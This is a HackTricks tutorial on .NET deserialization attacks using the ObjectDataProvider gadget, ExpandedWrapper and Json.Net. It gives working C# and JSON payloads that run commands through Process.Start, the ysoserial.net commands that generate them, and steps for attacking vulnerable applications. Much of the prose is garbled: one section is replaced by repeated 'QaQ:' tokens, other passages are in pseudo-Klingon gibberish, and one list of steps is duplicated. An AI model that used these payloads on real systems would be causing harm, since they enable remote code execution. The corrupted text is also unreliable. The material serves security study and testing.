# Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

This post is dedicated to **understand how the gadget ObjectDataProvider is exploited** to obtain RCE and **how** the Serialization libraries **Json.Net and xmlSerializer can be abused** with that gadget.

## ObjectDataProvider Gadget

From the documentation: _the ObjectDataProvider Class Wraps and creates an object that you can use as a binding source_.\
Yeah, it's a weird explanation, so lets see what does this class have that is so interesting: This class allows to **wrap an arbitrary object**, use _**MethodParameters**_ to **set arbitrary parameters,** and then **use MethodName to call an arbitrary function** of the arbitrary object declared using the arbitrary parameters.\
Therefore, the arbitrary **object** will **execute** a **function** with **parameters while being deserialized.**

### **How is this possible**

The **System.Windows.Data** namespace, found within the **PresentationFramework.dll** at `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF`, is where the ObjectDataProvider is defined and implemented.

Using [**dnSpy**](https://github.com/0xd4d/dnSpy) you can **inspect the code** of the class we are interested in. In the image below we are seeing the code of **PresentationFramework.dll --> System.Windows.Data --> ObjectDataProvider --> Method name**

![](<../../.gitbook/assets/image (299).png>)

As you can observe when `MethodName` is set `base.Refresh()` is called, lets take a look to what does it do:

![](<../../.gitbook/assets/image (300).png>)

Ok, lets continue seeing what does `this.BeginQuery()` does. `BeginQuery` is overridden by `ObjectDataProvider` and this is what it does:

![](<../../.gitbook/assets/image (301).png>)

Note that at the end of the code it's calling `this.QueryWorke(null)`. Let's see what does that execute:

![](<../../.gitbook/assets/image (302) (1).png>)

Note that this isn't the complete code of the function `QueryWorker` but it shows the interesting part of it: The code **calls `this.InvokeMethodOnInstance(out ex);`** this is the line where the **method set is invoked**.

If you want to check that just setting the _**MethodName**_\*\* it will be executed\*\*, you can run this code:
```java
using System.Windows.Data;
using System.Diagnostics;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ObjectDataProvider myODP = new ObjectDataProvider();
myODP.ObjectType = typeof(Process);
myODP.MethodParameters.Add("cmd.exe");
myODP.MethodParameters.Add("/c calc.exe");
myODP.MethodName = "Start";
}
}
}
```
QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ: QaQ:
```java
using System.Windows.Data;
using System.Diagnostics;
using System.Data.Services.Internal;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
myExpWrap.ProjectedProperty0.ObjectInstance = new Process();
myExpWrap.ProjectedProperty0.MethodParameters.Add("cmd.exe");
myExpWrap.ProjectedProperty0.MethodParameters.Add("/c calc.exe");
myExpWrap.ProjectedProperty0.MethodName = "Start";
}
}
}
```
## Json.Net

[QaQ](https://www.newtonsoft.com/json) vItlhutlh **Serialize and deserialize any .NET object with Json.NET's powerful JSON serializer**. So, **ObjectDataProvider gadget** **deserialize** vItlhutlh, **RCE** vItlhutlh deserializing an object.

### Json.Net example

First of all lets see an example on how to **serialize/deserialize** an object using this library:
```java
using System;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Collections.Generic;

namespace DeserializationTests
{
public class Account
{
public string Email { get; set; }
public bool Active { get; set; }
public DateTime CreatedDate { get; set; }
public IList<string> Roles { get; set; }
}
class Program
{
static void Main(string[] args)
{
Account account = new Account
{
Email = "james@example.com",
Active = true,
CreatedDate = new DateTime(2013, 1, 20, 0, 0, 0, DateTimeKind.Utc),
Roles = new List<string>
{
"User",
"Admin"
}
};
//Serialize the object and print it
string json = JsonConvert.SerializeObject(account);
Console.WriteLine(json);
//{"Email":"james@example.com","Active":true,"CreatedDate":"2013-01-20T00:00:00Z","Roles":["User","Admin"]}

//Deserialize it
Account desaccount = JsonConvert.DeserializeObject<Account>(json);
Console.WriteLine(desaccount.Email);
}
}
}
```
### Json.Net jol

[ysoserial.net](https://github.com/pwntester/ysoserial.net) v0.0.4.0 has a gadget called `Json.Net` that can be used to exploit deserialization vulnerabilities in .NET applications.

#### Usage

To use the `Json.Net` gadget, follow these steps:

1. Download and compile `ysoserial.net` from the [official GitHub repository](https://github.com/pwntester/ysoserial.net).
2. Execute the following command to generate the payload:

```plaintext
ysoserial.exe -g Json.Net -c "<command>"
```

Replace `<command>` with the command you want to execute on the target system.

3. The payload will be generated and displayed on the console. Copy the payload.

#### Exploitation

To exploit the deserialization vulnerability using the `Json.Net` gadget, follow these steps:

1. Identify the vulnerable .NET application that uses `Json.Net` for deserialization.
2. Craft a request that triggers the deserialization process.
3. Modify the request payload to include the generated payload from `ysoserial.net`.
4. Send the modified request to the target application.
5. If the exploitation is successful, the command specified in the payload will be executed on the target system.

#### Example

Here is an example of how to exploit a deserialization vulnerability using the `Json.Net` gadget:

1. Identify a vulnerable .NET application that uses `Json.Net` for deserialization.
2. Craft a request to trigger the deserialization process.
3. Modify the request payload to include the generated payload from `ysoserial.net`.
4. Send the modified request to the target application.
5. If the exploitation is successful, the command specified in the payload will be executed on the target system.

Remember to always perform these actions within a legal and authorized environment.
```java
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
In this code you can **test the exploit**, just run it and you will see that a calc is executed:

**tlhIngan Hol:**

qaStaHvIS, vaj 'ej vay' Dachegh 'e' vItlhutlh! vaj 'ej vItlhutlh 'e' vIleghlaHbe':
```java
using System;
using System.Text;
using Newtonsoft.Json;

namespace DeserializationTests
{
class Program
{
static void Main(string[] args)
{
//Declare exploit
string userdata = @"{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
//Exploit to base64
string userdata_b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userdata));

//Get data from base64
byte[] userdata_nob64 = Convert.FromBase64String(userdata_b64);
//Deserialize data
string userdata_decoded = Encoding.UTF8.GetString(userdata_nob64);
object obj = JsonConvert.DeserializeObject<object>(userdata_decoded, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
}
}
}
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Do you work in a cybersecurity company**? **jImej** **HackTricks** **laH** **company** **advertised** **want**? **PEASS** **latest version** **download** **HackTricks** **PDF** **access** **want**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **check**!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover**, **exclusive NFTs** **collection** **our**.
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Get**.
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **or** [**telegram group**](https://t.me/peass) **follow** **me** **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
